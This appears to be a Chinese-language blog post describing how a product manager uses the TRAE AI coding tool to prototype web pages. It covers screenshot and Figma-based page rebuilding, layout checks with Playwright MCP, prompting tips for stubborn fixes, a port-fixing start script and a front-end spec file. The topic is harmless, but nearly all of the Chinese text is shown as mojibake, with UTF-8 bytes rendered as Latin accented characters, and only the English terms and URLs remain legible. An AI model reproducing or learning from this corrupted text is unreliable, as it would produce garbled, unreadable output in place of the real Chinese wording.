<p>æ¥ä¸‹æ¥ï¼Œæˆ‘å°†ç»“åˆä¸€ä¸ªBç«¯äº§å“ç»ç†çš„æ—¥å¸¸ï¼Œé€šè¿‡ä¸‰ä¸ªæœ€å…¸å‹çš„å·¥ä½œåœºæ™¯ï¼Œå±•ç¤º TRAE æ˜¯å¦‚ä½•é¢ è¦†ä¼ ç»Ÿå·¥ä½œæ¨¡å¼çš„ã€‚æ¯ä¸€ä¸ªåœºæ™¯éƒ½é™„å®æˆ˜æ¡ˆä¾‹å’Œå¯ç›´æ¥å¤ç”¨çš„æŠ€å·§ï¼Œå»ºè®®æ”¶è—å¤‡ç”¨ï¼</p>
<h3 data-id="heading-4"><strong>åœºæ™¯ä¸€ï¼šéœ€æ±‚è¿­ä»£ä¸åŸå‹è®¾è®¡</strong></h3>
<p><strong>å·¥ä½œæµå¯¹æ¯”ï¼š</strong></p>
<p><strong>è¿‡å» (Old School)</strong></p>
<ul>
<li>
<p><strong>ç—›è‹¦ç”»å›¾ï¼š</strong> åœ¨ Axure/Figma ä¸­åå¤æ‹–æ‹½ï¼Œä¸ºäº†ä¸€ä¸ªæŒ‰é’®çš„å¯¹é½çº ç»“åŠå¤©ã€‚äº§å‡ºçš„æ˜¯ä½ä¿çœŸçº¿æ¡†å›¾ï¼Œä¸æœ€ç»ˆæ•ˆæœå·®å¼‚å·¨å¤§ã€‚</p>
</li>
<li>
<p><strong>åå¤æ‹‰æ‰¯ï¼š</strong> æ‹¿ç€çº¿æ¡†å›¾å‘è€æ¿ã€UIã€ç ”å‘è§£é‡Šï¼Œâ€œè¿™é‡Œä»¥åæ˜¯å½©è‰²çš„â€ã€â€œè¿™ä¸ªæŒ‰é’®ç‚¹å‡»åä¼šå¼¹å‡ºä¸€ä¸ªæ¡†â€â€¦ æ²Ÿé€šæˆæœ¬é«˜ï¼Œä¿¡æ¯æŸè€—ä¸¥é‡ã€‚</p>
</li>
<li>
<p><strong>æ—¶é—´æˆæœ¬ï¼š</strong> 2 äººå¤©èµ·æ­¥ã€‚</p>
</li>
</ul>
<p><strong>ç°åœ¨ (TRAE Flow)</strong></p>
<ul>
<li>
<p><strong>â€œå˜´æ›¿â€ç¼–ç¨‹ï¼š</strong> ä¸€å¼ æˆªå›¾ã€ä¸€ä¸ª Figma é“¾æ¥ï¼Œç›´æ¥â€œå–‚â€ç»™ TRAEï¼Œå³åˆ»ç”Ÿæˆé«˜ä¿çœŸ HTML é¡µé¢ã€‚</p>
</li>
<li>
<p><strong>å…‰é€Ÿå®šç¨¿ï¼š</strong> ä»»ä½•è°ƒæ•´ï¼Œç›´æ¥ç”¨è‡ªç„¶è¯­è¨€â€œå‘Šè¯‰â€TRAEï¼ŒåŠå°æ—¶å†…å°±èƒ½çœ‹åˆ°æœ€ç»ˆæ•ˆæœï¼Œå®ç°â€œä¼šä¸Šå†³ç­–ã€å½“åœºä¿®æ”¹ã€å³æ—¶ç”Ÿæ•ˆâ€ã€‚</p>
</li>
<li>
<p><strong>æ—¶é—´æˆæœ¬ï¼š</strong> 0.5 äººå¤©ï¼Œæ•ˆç‡æå‡è‡³å°‘ 4 å€ã€‚</p>
</li>
</ul>
<p><strong>æ ¸å¿ƒä»·å€¼ï¼šæ•ˆç‡æå‡4 å€ï¼Œè¿™ä¸ä»…èŠ‚çœäº†æ—¶é—´ï¼Œæ›´å°†äº§å“ç»ç†ä»é‡å¤æ€§åŠ³åŠ¨ä¸­è§£æ”¾å‡ºæ¥ï¼Œå›å½’åˆ°åˆ›é€ æ€§æ€è€ƒæœ¬èº«ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/770bae44f32b4cd497ccb17674c8ae19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=bS6VbG07%2FmOJxDAgpiXB9sSR4Dw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5"><strong>å®æˆ˜æ¡ˆä¾‹ï¼šç»™ TRAE å®˜ç½‘åŠ ä¸ªèŠå¤©æœºå™¨äºº</strong></h3>
<p><strong>TRAE é…ç½®æ¸…å•ï¼š</strong></p>
<ul>
<li>
<p><strong>æ¨¡å‹ï¼š</strong> gemini-3-pro-preview</p>
</li>
<li>
<p><strong>æ™ºèƒ½ä½“ï¼š</strong> Builder with MCP</p>
</li>
<li>
<p><strong>MCPï¼š</strong> Playwright, Figma AI Bridge (å¯é€‰)</p>
</li>
<li>
<p><em>(MCP é…ç½®æ–¹å¼è§æ–‡æœ«é™„å½•)</em></p>
</li>
</ul>
<p><strong>éœ€æ±‚èƒŒæ™¯ï¼š</strong> åœ¨ TRAE çš„ Profile é¡µé¢å³ä¾§ï¼Œå¢åŠ ä¸€ä¸ªä¸»æµçš„ä¾§è¾¹ Agent èŠå¤©é¢æ¿ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1b0faff033b44b9bd351a18564a5d9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=gCUwTeu4wI4xjvSJPlkkOuYGLIw%3D" alt="" loading="lazy"/>ç›®æ ‡åŸå‹æ•ˆæœ</p>
<h4 data-id="heading-6"><strong>ç¬¬ä¸€æ­¥ï¼šè¿˜åŸç°çŠ¶ï¼Œè®© TRAE çœ‹æ‡‚ä½ çš„äº§å“</strong></h4>
<p>è¦åœ¨ä¸€ä¸ªç°æœ‰äº§å“ä¸Šåšè¿­ä»£ï¼Œé¦–å…ˆå¾—è®© TRAE â€œçœ‹æ‡‚â€å½“å‰çš„é¡µé¢ã€‚è¿™é‡Œæœ‰ä¸¤ç§é«˜æ•ˆçš„æ–¹æ³•ï¼š</p>
<p><strong>1. é¡µé¢æˆªå›¾æ³• (æˆªå›¾ + Playwright MCP)</strong></p>
<p>è¿™æ˜¯æœ€ç›´æ¥çš„æ–¹å¼ã€‚å°†ä½ è¦è¿­ä»£çš„é¡µé¢å®Œæ•´æˆªå›¾ï¼Œç„¶åç”¨è¿™æ ·çš„æç¤ºè¯å–‚ç»™ TRAEï¼š</p>
<p><strong>ğŸ’¡ æç¤ºè¯å¿ƒå¾—ï¼š</strong></p>
<blockquote>
<p>æ ¸å¿ƒæ˜¯å‘Šè¯‰ TRAE ä½ çš„ç›®çš„å’Œçº¦æŸã€‚ä¸éœ€è¦é•¿ç¯‡å¤§è®ºï¼Œä½†è¦åŒ…å«å…³é”®ä¿¡æ¯ã€‚</p>
<p>â€œæ ¹æ®æˆ‘ç»™ä½ çš„è¿™å¼ è®¾è®¡å›¾ï¼Œå¸®æˆ‘1:1 è¿˜åŸä¸€ä¸ªå‰ç«¯ HTML é¡µé¢ã€‚<strong>è¿™åªæ˜¯ä¸€ä¸ªç”¨äºéœ€æ±‚æ²Ÿé€šçš„ Demoï¼Œä¸éœ€è¦è¿æ¥åç«¯æ¥å£ã€‚</strong> æŠ€æœ¯æ ˆä½¿ç”¨ Reactã€‚â€</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af74e4bebab64361b9134e809fda1abb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=N6kmUvGoUNvASJUhmHlDYW14KH4%3D" alt="" loading="lazy"/></p>
<p><strong>2. è®¾è®¡ç¨¿è¿˜åŸæ³• (Figma + AI Bridge)</strong></p>
<p>å€ŸåŠ© <strong>Builder.io æ’ä»¶ã€‚</strong> å®ƒå¯ä»¥å¤åˆ¶å‰ç«¯é¡µé¢çš„å¸ƒå±€ï¼Œç»“åˆå®ƒåœ¨ Figma ä¸Šçš„æ’ä»¶ï¼Œèƒ½å¤Ÿå°†å‰ç«¯è¿˜åŸåˆ° Figma ä¸­ã€‚</p>
<p>ç„¶åå†ç²˜è´´ Figma çš„ç´ æåœ°å€ï¼Œä½¿ç”¨ <strong>Figma AI Bridge MCP</strong> æ¥è¿˜åŸè¿™ä¸ªå‰ç«¯é¡µé¢ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c806d57d32a9495ab10975cb140278d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=n2ZNiFxU9S5S4GXLykPusGnvlJI%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82562a7150a044978a3dbedc9c6618c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=Fi%2FnnH%2FqB%2FJWBDHFvVk%2FfzIUU0o%3D" alt="" loading="lazy"/></p>
<p><strong>æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<blockquote>
<p>è¯·ä½ ä½¿ç”¨ figma ai bridge mcpï¼Œè¯»å–æˆ‘çš„è®¾è®¡å›¾ https:.... æ¥å¸®æˆ‘1:1 è¿˜åŸä¸€ä¸ªå‰ç«¯çš„ html é¡µé¢ã€‚å¹¶ä¸”ä¸éœ€è¦æ¥å…¥åç«¯ï¼Œå› ä¸ºæˆ‘çš„é¡¹ç›®æ˜¯ä¸€ä¸ªä»…å‰ç«¯ç”¨äºéœ€æ±‚åŒæ­¥çš„ demo é¡¹ç›®ï¼Œé¡µé¢ä¸Šçš„æ•°æ®ï¼Œéƒ½é‡‡å–å‰ç«¯å†™å…¥çš„æ–¹å¼ï¼Œä¸éœ€è¦ç”¨åˆ°åç«¯çš„æ¥å£è·å–ã€‚è¯­è¨€ä½¿ç”¨ react</p>
</blockquote>
<h4 data-id="heading-7"><strong>ç¬¬äºŒæ­¥ï¼šè¿˜åŸæ•ˆæœæ£€æŸ¥</strong></h4>
<p><strong>æ ¸å¿ƒå·¥å…·ï¼šPlaywright MCP</strong></p>
<p>åœ¨ TRAE åšå®Œäº†åˆæ­¥çš„å®ç°ä»¥åï¼Œå¤šå°‘æ˜¯ä¼šè·Ÿæˆ‘ä»¬çš„å‚è€ƒçš„ç½‘é¡µæœ‰äº›å·®å¼‚ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ° <strong>Playwright MCP</strong> äº†ã€‚</p>
<p><strong>æ ¸å¿ƒç›®çš„ï¼š</strong> è®© TRAE èƒ½å¤Ÿæ‰“å¼€ç›®å‰å·²ç»å†™å‡ºæ¥çš„ç½‘é¡µï¼Œè·å–å‰ç«¯çš„å±•ç¤ºä¿¡æ¯ï¼Œè¿™æ · TRAE å°±èƒ½å¤Ÿå¯¹å¾—ä¸Šå®ƒçš„ä»£ç ï¼Œä»¥åŠæœ€ç»ˆçš„å‰ç«¯å‘ˆç°ã€‚</p>
<p><strong>è¿›é˜¶ç”¨é€”ï¼š</strong> ä½ ä¹Ÿå¯ä»¥è®©ä»–æ‰“å¼€æˆ‘ä»¬<strong>å‚è€ƒçš„ç½‘é¡µ</strong>ï¼Œå¯¹ç…§å‚è€ƒç½‘é¡µçš„å‰ç«¯æ ·å¼å®ç°å’Œæ ·å¼è§„èŒƒï¼Œæ£€æŸ¥ç›®å‰å®ƒå®ç°çš„å‰ç«¯é¡µé¢æ˜¯å¦å­˜åœ¨å“ªäº›åœ°æ–¹æ˜¯æ²¡æœ‰æŒ‰ç…§ç›®æ ‡å®ç°çš„ã€‚</p>
<p><strong>æ£€æŸ¥æ—¶çš„æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<blockquote>
<p>è¯·ä½ ç”¨ playwrightmcp æ‰“å¼€ä½ ç›®å‰å®ç°çš„å‰ç«¯é¡µé¢ã€‚ä»¥åŠæˆ‘ç»™ä½ çš„è¿™ä¸ªå‚è€ƒç½‘ç«™ https:....ï¼›æˆ‘å¸Œæœ›ä½ èƒ½å¤Ÿå¯¹ç…§ä½ ç›®å‰çš„å‰ç«¯é¡µé¢ï¼Œä¸æˆ‘çš„å‚è€ƒç½‘ç«™çš„å‰ç«¯æ ·å¼ã€‚å¸®æˆ‘æ£€æŸ¥è¿˜æœ‰å“ªä¸€äº›æ¨¡å—æ²¡æœ‰åšåˆ° 1:1 çš„è¿˜åŸã€‚å› ä¸ºå‰é¢ç»™ä½ çš„è®¾è®¡å›¾ï¼Œå…¶å®å°±æ˜¯æ¥æºäºè¿™ä¸ªå‚è€ƒç½‘ç«™çš„ã€‚</p>
<p>åœ¨ä½ æ£€æŸ¥çš„æ—¶å€™ï¼Œè¯·ä½ ç‰¹åˆ«æ³¨æ„ä»¥ä¸‹çš„å‡ ä¸ªç»´åº¦æ˜¯å¦å¾—åˆ°äº†è¿˜åŸï¼š</p>
<ul>
<li>å­—å·å¤§å°çš„å±‚çº§å…³ç³»</li>
<li>å®¹å™¨ä¹‹é—´çš„é—´è·ä¸å¯¹é½</li>
<li>é¢œè‰²ç³»ç»Ÿ</li>
</ul>
</blockquote>
<h4 data-id="heading-8"><strong>ç¬¬ä¸‰æ­¥ï¼šç»†èŠ‚å¾®è°ƒï¼Œæå®šâ€œå€”å¼ºâ€çš„AI</strong></h4>
<p>æ€»æœ‰äº›ç»†èŠ‚ï¼ŒTRAE å¯èƒ½ä¼šåå¤ä¿®æ”¹å´ä¾ç„¶é”™æ¼ï¼Œç”šè‡³â€œå˜´ç¡¬â€è¯´å·²ç»æ”¹å¥½äº†ã€‚è¿™é€šå¸¸æ„å‘³ç€ TRAE çš„é»˜è®¤è§£å†³è·¯å¾„é‡åˆ°äº†éšœç¢ã€‚æ­¤æ—¶ï¼Œéœ€è¦æˆ‘ä»¬æä¾›æ›´ç²¾å‡†çš„â€œå¯¼èˆªâ€ã€‚</p>
<p><strong>1ã€å¤åˆ¶ Classname ç²¾å‡†å®šä½</strong></p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æˆªå›¾ï¼Œä»¥åŠå¤åˆ¶å‰ç«¯çš„ <em><strong>classname</strong></em> çš„å½¢å¼ï¼Œå‘Šè¯‰ TRAE åˆ°åº•å“ªä¸€å—æ˜¯è¿˜åšçš„ä¸åˆ°ä½çš„ï¼Œåº”è¯¥è¦æ€ä¹ˆåšã€‚</p>
<p><strong>æ“ä½œæŠ€å·§ï¼š</strong></p>
<blockquote>
<p>æ‰“å¼€æµè§ˆå™¨çš„æ£€æŸ¥ï¼ˆå³é”® -&gt; æ£€æŸ¥ï¼Œæˆ–è€… F12ï¼‰ï¼Œé€šè¿‡å…ƒç´ é€‰æ‹©å™¨å®šä½åˆ°ç›®æ ‡å…ƒç´ ï¼Œåœ¨å³ä¾§ DOM æ ‘ä¸­åŒå‡»é€‰ä¸­ç›®æ ‡çš„ <em><strong>classname</strong></em> å¹¶å¤åˆ¶ã€‚</p>
</blockquote>
<p><strong>æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<blockquote>
<p>ç›®å‰æˆ‘è§‚å¯Ÿåˆ°ï¼Œå‰ç«¯çš„ **<em>{{classname}}</em> **è¿˜æ²¡æœ‰æŒ‰æˆ‘çš„è¦æ±‚è¿˜åŸã€‚ä¹Ÿå°±æ˜¯æˆ‘ç»™ä½ å‘é€çš„é¡µé¢æˆªå›¾å›¾ 1ï¼ˆæ­¤å¤„ç²˜è´´å®ç°çš„å›¾ç‰‡ï¼‰ã€‚æˆ‘å¸Œæœ›ä½ æ ¹æ®å›¾ 2 çš„æ ·å¼å¸®æˆ‘åšè¿˜åŸï¼ˆæ­¤å¤„ç²˜è´´æœŸæœ›æ ·å¼çš„æˆªå›¾ï¼‰ã€‚</p>
<p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ playwrightmcp æ‰“å¼€æˆ‘çš„å‚è€ƒç½‘ç«™ https:... ä¸­ï¼ŒæŸ¥çœ‹ **<em>{{æˆ‘å‚è€ƒç½‘ç«™å¯¹åº”ç»„ä»¶ classname}}</em> **çš„å®ç°ï¼Œå¹¶åœ¨æˆ‘çš„é¡¹ç›®ä¸­ 1:1 çš„è¿˜åŸå®ƒã€‚</p>
</blockquote>
<p><strong>2ã€å½“ TRAEã€Œæ­»é¸­å­å˜´ç¡¬ã€æ—¶æ€ä¹ˆåŠ</strong></p>
<p>å¦‚æœè¿˜æœ‰ä¸€äº›ç»†èŠ‚ï¼ŒTRAE æ— æ³•è¿˜åŸå¹¶åå¤â€œå˜´ç¡¬â€è¯´æ”¹å¥½äº†</p>
<p>è¿™æ—¶å€™æˆ‘åŸºæœ¬åˆ¤æ–­ï¼š<strong>å¯èƒ½ TRAE è‡ªå·±ä¹ æƒ¯çš„åˆ¤æ–­æˆ–è€…å®ç°çš„ç»´åº¦ï¼Œå¹¶ä¸èƒ½è§£å†³æˆ‘çš„é—®é¢˜ã€‚åˆ†äº«4ä¸ªç»ˆææ‰‹æ®µï¼Œäº²æµ‹æœ‰æ•ˆï¼š</strong></p>
<ul>
<li>
<p><strong>ç»†è‡´è¡¨è¾¾ï¼š</strong> å°†ä½ è®¤ä¸ºä¸€ç›´æ²¡æœ‰å®ç°çš„åœ°æ–¹ï¼Œæ›´ç»†è‡´åœ°è¡¨è¾¾å‡ºæ¥ï¼ˆè¿ç”¨ classnameã€æˆªå›¾ã€playwright ç­‰ï¼‰ã€‚æˆ–è€…è¯¦ç»†åœ°ç”¨è‡ªç„¶è¯­è¨€è¡¨è¾¾ç°çŠ¶ vs æœŸæœ›ï¼Œè®© TRAE å¸®ä½ æ ¹æ®ç°çŠ¶ä»£ç çŒœæµ‹åŸå› ã€‚</p>
</li>
<li>
<p><strong>æŒ‡å®šç»´åº¦ï¼š</strong> å¦‚æœä½ è‡ªå·±çŸ¥é“å¤§æ¦‚æ˜¯ä»€ä¹ˆç»´åº¦ï¼ˆæ¯”å¦‚ flex å¸ƒå±€ã€z-index å±‚çº§ï¼‰å¯èƒ½èƒ½å¤Ÿä¿®å¤è¿™ä¸ªé—®é¢˜ï¼Œå°±è®©æ¨¡å‹å¾€è¿™ä¸ªç»´åº¦ä¸Šå»æ€è€ƒã€‚</p>
</li>
<li>
<p><strong>æ›´æ¢æ¨¡å‹ï¼š</strong> çœ‹çœ‹å…¶ä»–æ¨¡å‹ï¼ˆå¦‚ GPT-5.2 æˆ– GPT-5.1ï¼‰å¯¹äºè¿™ä¸ªåœºæ™¯ä¸‹ï¼Œæ˜¯å¦å®ƒçš„ä¹ æƒ¯æ€§è§£å†³æ–¹æ¡ˆèƒ½å¤Ÿè¦†ç›–è¿™ä¸ªé—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>é‡ç½®ä¸Šä¸‹æ–‡ï¼š</strong> æ–°å¼€å¯¹è¯ï¼Œçœ‹çœ‹æ˜¯å¦å› ä¸ºä¸Šä¸‹æ–‡è¿‡é•¿å¯¼è‡´æ¨¡å‹å­˜åœ¨äº†ä¸´æ—¶çš„ã€Œæ€ç»´å®šå¼ã€ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2c75148355143b1b3f9eee2cce918d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=dEzR1eoQPYIWqBQw4aOtvw%2F7Aqo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-9"><strong>å®Œæˆå‰ä¸‰æ­¥çš„å…³é”®æ€»ç»“ï¼š</strong></h4>
<p><strong>1ã€æç¤ºè¯æŠ€å·§</strong></p>
<p>å›é¡¾æˆ‘è¿˜åŸ TRAE Profile é¡µé¢çš„è¿‡ç¨‹ï¼Œå¤§æ¦‚æ‰«ä¸€ä¸‹å°±å¯ä»¥å‘ç°ï¼Œæˆ‘è·Ÿ TRAE çš„äº¤äº’æç¤ºè¯ï¼Œä¸»æ‰“ä¸€ä¸ª<strong>è‡ªç”±éšæ€§</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebff9b73a4eb4cd2a762680e803caa44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=bd773kFRfevu0qe9EL%2BuanDJRRE%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93165834d1bd4b2aa6611b13084dfe85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=uaIRRhbuZS31LVMk%2Bh5%2F0s5z3Rk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2937d85b16844a8198155ba701d7dbf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=k18X9fahL1GnWdROJ6xcn9NHUwA%3D" alt="show_682105790_1770623468623.png" loading="lazy"/></p>
<p><strong>é‡ç‚¹å…¶å®è¿˜æ˜¯è¿™3ç‚¹ï¼Œè®°ç‰¢å°±èƒ½å°‘è¸©å‘ï¼š</strong></p>
<ul>
<li>
<p>æœ‰æ²¡æœ‰æŠŠéœ€æ±‚è¡¨è¾¾æ¸…æ¥šï¼Ÿ</p>
</li>
<li>
<p>æ˜¯å¦ç»™è¶³äº† AI å®šä½é—®é¢˜çš„å‚è€ƒä¿¡æ¯ï¼Ÿ</p>
</li>
<li>
<p>æ˜¯å¦æä¾›äº†ç›®æ ‡å®ç°çš„å‚è€ƒä¿¡æ¯ï¼Ÿ</p>
</li>
</ul>
<p>ç»™å‡ºä»¥ä¸Šå…³é”®ä¿¡æ¯çš„æ‰‹æ®µï¼Œå¯ä»¥æ˜¯<strong>æ–‡æœ¬æè¿°</strong>ï¼Œå¯ä»¥æ˜¯<strong>æˆªå›¾</strong>ï¼Œä¹Ÿå¯ä»¥æ˜¯åˆ©ç”¨ <strong>Playwright MCP</strong> è®© TRAE è‡ªå·±å»åšå‚ç…§ã€‚</p>
<p><strong>2ã€é¡¹ç›®è§„èŒƒæœ€ä½³å®è·µ</strong></p>
<p>å½“é¡¹ç›®è¾¾åˆ°åŸºç¡€å¯ç”¨çŠ¶æ€ä¹‹åï¼Œå»ºè®®å¤§å®¶åš2ä»¶äº‹ï¼š</p>
<p><strong>â‘ ç¼–å†™å¯åŠ¨è„šæœ¬</strong></p>
<p>è®© AI å¸®ä½ å†™ä¸€ä¸ª <em><strong>sh</strong></em> çš„å¯åŠ¨è„šæœ¬ã€‚è¿™æ ·æ–¹ä¾¿æˆ‘ä»¬åé¢éœ€è¦å†æ¬¡å¯åŠ¨è¿™ä¸ªé¡¹ç›®æ—¶ï¼Œç›´æ¥å°†è¿™ä¸ªè„šæœ¬æ‹–æ‹½åˆ°ç»ˆç«¯ï¼Œå›è½¦æ‰§è¡Œå³å¯å¯åŠ¨ã€‚</p>
<p><strong>å»ºè®®åŠ ä¸Šå‡ ä¸ªç»†èŠ‚ï¼š</strong></p>
<ul>
<li>
<p><strong>å›ºå®šç«¯å£ï¼š</strong> å…è®¸æ¸…ç©ºå ç”¨ï¼Œå†å¯åŠ¨ã€‚é˜²æ­¢ç«¯å£å†²çªã€‚</p>
</li>
<li>
<p><strong>æ‰“å°åœ°å€ï¼š</strong> å¯åŠ¨ååœ¨ç»ˆç«¯æ‰“å°è®¿é—®åœ°å€ï¼Œæ–¹ä¾¿ç‚¹å‡»ã€‚</p>
</li>
</ul>
<p><strong>æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<blockquote>
<p>è¯·ä½ å¸®æˆ‘åˆ›å»ºä¸€ä¸ª sh çš„ start è„šæœ¬ï¼Œæ–¹ä¾¿æˆ‘æ¯æ¬¡å¯åŠ¨é¡¹ç›®éƒ½åªéœ€è¦åœ¨ç»ˆç«¯æ‰§è¡Œè¿™ä¸ª sh è„šæœ¬ã€‚å¹¶ä¸”æˆ‘å¸Œæœ›è¿™ä¸ªè„šæœ¬èƒ½å¤Ÿæ¯æ¬¡éƒ½å›ºå®šç«¯å£å¯åŠ¨ï¼Œå¦‚æœé‡åˆ°ç«¯å£è¢«å ç”¨çš„æƒ…å†µï¼Œéœ€è¦æ¸…ç†è¢«å ç”¨çš„ç«¯å£ï¼Œå†ä½¿ç”¨è¯¥ç«¯å£å¯åŠ¨ï¼Œä¿è¯æ¯æ¬¡éƒ½èƒ½å¤Ÿå›ºå®šç«¯å£ã€‚åŒæ—¶åœ¨å¯åŠ¨æˆåŠŸåï¼Œéœ€è¦åœ¨ç»ˆç«¯æ‰“å°å‡ºæˆ‘çš„è®¿é—®åœ°å€ã€‚</p>
</blockquote>
<p><strong>â‘¡æ²‰æ·€å‰ç«¯è§„èŒƒæ–‡æ¡£ (FRONTEND_SPEC.md)</strong></p>
<p>è®© TRAE å¸®ä½ æ€»ç»“ä¸€ä¸ªå‰ç«¯è§„èŒƒçš„ md æ–‡æ¡£ã€‚</p>
<p>åé¢ç»§ç»­è¿­ä»£æ—¶ï¼Œåœ¨éœ€æ±‚å‰é¢å¸¦ä¸Šè¿™ä¸ªæ–‡æ¡£ï¼Œè®© TRAE éµå®ˆè§„èŒƒï¼Œèƒ½ä¿è¯æ ·å¼é£æ ¼ç»Ÿä¸€ï¼Œå¸ƒå±€æ›´åˆç†ã€‚</p>
<p><strong>å»ºè®®åŒ…å«ä»¥ä¸‹ç»´åº¦ï¼š</strong></p>
<ul>
<li>
<p>é—´è·ç³»ç»Ÿ</p>
</li>
<li>
<p>é¢œè‰²ç³»ç»Ÿ</p>
</li>
<li>
<p>å­—ä½“å±‚çº§ä¸å­—å·å¤§å°</p>
</li>
<li>
<p>ç½‘é¡µå¸ƒå±€æ¡†æ¶</p>
</li>
</ul>
<p><strong>æç¤ºè¯ç¤ºä¾‹ï¼š</strong></p>
<blockquote>
<p>è¯·ä½ æ ¹æ®å½“å‰çš„æ ·å¼å®ç°ï¼Œå¸®æˆ‘åˆ›å»ºä¸€ä»½å‰ç«¯è§„èŒƒçš„ md æ–‡æ¡£ã€‚è¿™ä¸€ä»½æ–‡æ¡£ï¼Œåœ¨åé¢å°†ä¼šä½œä¸ºæˆ‘çš„é¡¹ç›®çš„è®¾è®¡è§„èŒƒä½¿ç”¨ã€‚åœ¨è§„èŒƒé‡Œï¼Œæˆ‘è®¤ä¸ºè‡³å°‘éœ€è¦åŒ…å«ä»¥ä¸‹çš„æ¨¡å—ï¼š</p>
<ul>
<li>
<p>é¡¹ç›®å‰ç«¯é¡µé¢çš„åŸºç¡€å¸ƒå±€</p>
</li>
<li>
<p>å­—å·å¤§å°ç³»ç»Ÿ</p>
</li>
<li>
<p>é¢œè‰²ç³»ç»Ÿ</p>
</li>
<li>
<p>é—´è·ç³»ç»Ÿ</p>
</li>
</ul>
</blockquote>
<h4 data-id="heading-10"><strong>ç¬¬å››æ­¥ï¼šéœ€æ±‚è½åœ°ï¼Œè®©åŸå‹â€œåŠ¨â€èµ·æ¥</strong></h4>
<p>å½“é¡µé¢è¿˜åŸå®Œæ¯•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹çœŸæ­£çš„è¿­ä»£äº†ã€‚è¿˜è®°å¾—æˆ‘ä»¬çš„éœ€æ±‚å—ï¼Ÿ<strong>ğŸ‘‰ åœ¨å³ä¾§å¢åŠ ä¸€ä¸ªä¾§è¾¹çš„ Agent èŠå¤©é¢æ¿ã€‚</strong></p>
<p>ç”±äºåšè¿­ä»£åŸºæœ¬æ˜¯æ²¡æœ‰è®¾è®¡å›¾å‚è€ƒçš„ï¼Œè€ƒéªŒçš„å°±æ˜¯æˆ‘ä»¬<strong>é€šè¿‡æ–‡æœ¬æ¥è¡¨è¾¾äº¤äº’çš„èƒ½åŠ›ã€‚</strong></p>
<p><strong>æˆ‘çš„æ–¹æ³•è®ºï¼šç”¨â€œç”¨æˆ·è§†è§’â€æ¥æè¿°äº¤äº’ï¼Œè¡¨è¾¾æ¸…æ¥šä»¥ä¸‹5ç‚¹ï¼š</strong></p>
<ul>
<li>
<p>æˆ‘ä»¬å¸Œæœ›çš„äº¤äº’ï¼Œå®ƒä»èµ·å§‹åˆ°ç»“æŸï¼Œåœ¨ä»€ä¹ˆä½ç½®ï¼Ÿ</p>
</li>
<li>
<p>é€šè¿‡ä»€ä¹ˆæ“ä½œï¼Ÿ</p>
</li>
<li>
<p>ç‚¹å‡»åï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
</li>
<li>
<p>åˆåœ¨å“ªä¸ªä½ç½®å‡ºç°ï¼Ÿ</p>
</li>
<li>
<p>ä¼šå‡ºç°ä»€ä¹ˆå†…å®¹ï¼Ÿ</p>
</li>
</ul>
<p><strong>âš ï¸ è®°å¾—è¦æºå¸¦ä¸Šæˆ‘ä»¬ä¸Šé¢æ€»ç»“çš„é‚£ä¸€ä»½å‰ç«¯è§„èŒƒï¼</strong></p>
